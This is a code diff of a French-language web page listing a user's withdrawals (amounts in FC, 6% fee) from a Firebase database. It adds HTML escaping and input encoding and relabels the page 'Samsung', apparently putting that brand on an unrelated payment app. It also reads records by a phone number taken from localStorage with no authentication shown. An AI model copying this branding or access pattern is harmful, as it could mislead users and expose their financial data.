@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safe Alterplex - Historique des Retraits</title>
+    <title>Samsung - Historique des Retraits</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * {
@@ -198,7 +198,7 @@
     <!-- En-tête -->
     <div class="top-header">
         <a href="profil.html" class="back-btn"><i class="fas fa-arrow-left"></i></a>
-        <div class="brand-title">Historique des Retraits</div>
+        <div class="brand-title">Samsung - Historique des Retraits</div>
     </div>
 
     <div class="container">
@@ -232,11 +232,20 @@
         const dbUrl = "https://canal-e4274-default-rtdb.firebaseio.com";
         const userPhone = localStorage.getItem('userPhone') || '890000000';
 
+        // Fonction pour sécuriser l'affichage du texte (anti-XSS)
+        function escapeHtml(str) {
+            return String(str || '').replace(/[&<>"']/g, function(m) {
+                return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m];
+            });
+        }
+
         async function loadWithdrawHistory() {
             const container = document.getElementById('withdrawHistoryContainer');
 
             try {
-                const res = await fetch(`${dbUrl}/withdrawals/${userPhone}.json`);
+                const res = await fetch(`${dbUrl}/withdrawals/${encodeURIComponent(userPhone)}.json`);
+                if (!res.ok) throw new Error("Erreur serveur");
+
                 const historyData = await res.json();
 
                 if (!historyData || Object.keys(historyData).length === 0) {
@@ -249,13 +258,13 @@
                     return;
                 }
 
-                container.innerHTML = "";
-
                 // Conversion en tableau et tri du plus récent au plus ancien
                 const list = Object.keys(historyData).map(key => ({
                     id: key,
                     ...historyData[key]
                 })).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+
+                let htmlCards = "";
 
                 list.forEach(item => {
                     const dateFormatted = item.createdAt 
@@ -264,45 +273,52 @@
 
                     // Détermination du badge selon le statut
                     let statusBadge = '';
-                    if (item.status === 'Validé' || item.status === 'Approuvé') {
+                    const normalizedStatus = String(item.status || '').toLowerCase();
+                    if (normalizedStatus === 'validé' || normalizedStatus === 'approuvé' || normalizedStatus === 'approved') {
                         statusBadge = `<span class="status-badge status-approved"><i class="fas fa-circle-check"></i> Validé</span>`;
-                    } else if (item.status === 'Rejeté') {
+                    } else if (normalizedStatus === 'rejeté' || normalizedStatus === 'rejected') {
                         statusBadge = `<span class="status-badge status-rejected"><i class="fas fa-circle-xmark"></i> Rejeté</span>`;
                     } else {
                         statusBadge = `<span class="status-badge status-pending"><i class="fas fa-hourglass-half"></i> En attente</span>`;
                     }
 
-                    container.innerHTML += `
+                    const amount = Number(item.amount || 0).toLocaleString('fr-FR');
+                    const fee = Number(item.fee || 0).toLocaleString('fr-FR');
+                    const netAmount = Number(item.netAmount || 0).toLocaleString('fr-FR');
+
+                    htmlCards += `
                         <div class="history-card">
                             <div class="card-header">
-                                <span class="withdraw-amount">-${(item.amount || 0).toLocaleString('fr-FR')} FC</span>
+                                <span class="withdraw-amount">-${amount} FC</span>
                                 ${statusBadge}
                             </div>
                             <div class="card-details">
                                 <div class="detail-item">
                                     <span class="detail-label">Frais de retrait (6%)</span>
-                                    <span class="detail-value">${(item.fee || 0).toLocaleString('fr-FR')} FC</span>
+                                    <span class="detail-value">${fee} FC</span>
                                 </div>
                                 <div class="detail-item">
                                     <span class="detail-label">Montant net à recevoir</span>
-                                    <span class="detail-value" style="color: #137333;">${(item.netAmount || 0).toLocaleString('fr-FR')} FC</span>
+                                    <span class="detail-value" style="color: #137333;">${netAmount} FC</span>
                                 </div>
                             </div>
                             <div class="date-footer">
-                                <span><i class="fas fa-clock"></i> ${dateFormatted}</span>
+                                <span><i class="fas fa-clock"></i> ${escapeHtml(dateFormatted)}</span>
                                 <span>Délai moyen: ~10 min</span>
                             </div>
                         </div>
                     `;
                 });
 
+                container.innerHTML = htmlCards;
+
             } catch (err) {
                 console.error("Erreur de chargement de l'historique :", err);
-                container.innerHTML = `<div class="empty-state">Une erreur s'est produite lors du chargement des données.</div>`;
+                container.innerHTML = `<div class="empty-state" style="color: #d93025;">Une erreur s'est produite lors du chargement des données.</div>`;
             }
         }
 
-        window.onload = loadWithdrawHistory;
+        window.addEventListener('DOMContentLoaded', loadWithdrawHistory);
     </script>
 </body>
 </html>
